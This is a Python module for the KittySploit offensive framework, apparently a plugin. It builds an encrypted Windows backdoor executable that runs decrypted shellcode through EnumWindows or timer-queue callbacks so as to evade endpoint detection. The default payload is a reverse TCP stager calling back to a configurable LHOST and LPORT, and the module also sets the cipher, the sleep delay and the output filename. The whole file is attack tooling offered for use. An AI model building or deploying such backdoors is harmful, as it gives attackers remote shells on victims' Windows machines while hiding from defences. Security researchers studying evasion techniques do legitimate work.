#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.compile.backdoor_helpers import build_encrypted_zig_backdoor, option_value
from lib.compile.callback_execution import CallbackExecutionBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Callback Execution Evasion",
        "description": (
            "Run decrypted shellcode through a Windows callback API (EnumWindows or "
            "CreateTimerQueueTimer) instead of CreateThread."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/JoasASantos/Awesome-EDR-Evasion/blob/main/Codes/12_callback_execution.c",
        ],
    }

    payload_path = OptString("payloads/stagers/windows/x86/reverse_tcp", "Payload path", True)
    lhost = OptString("127.0.0.1", "LHOST", True)
    lport = OptPort(4444, "LPORT", True)
    encoder = OptString("", "Encoder (optional)", False)
    cipher = OptChoice("chacha", "Cipher", True, ["chacha", "rc4"])
    exec_method = OptChoice(
        "enum_windows",
        "Callback API used to run shellcode",
        False,
        ["enum_windows", "timer_queue"],
    )
    sleep = OptInteger(5000, "Sleep ms before callback", False)
    output_name = OptString("callback_exec.exe", "Output filename", False)
    optimization = OptChoice("ReleaseSmall", "Optimization", False, ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"])
    save_source = OptBool(False, "Save C source", False, advanced=True)
    windows_subsystem = OptChoice("windows", "Subsystem", False, ["windows", "console"])

    def run(self):
        builder = CallbackExecutionBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
            method=str(option_value(self, "exec_method") or "enum_windows"),
        )
        return build_encrypted_zig_backdoor(
            self,
            builder,
            output_name="callback_exec.exe",
            save_source_name="callback_exec.zig",
        )
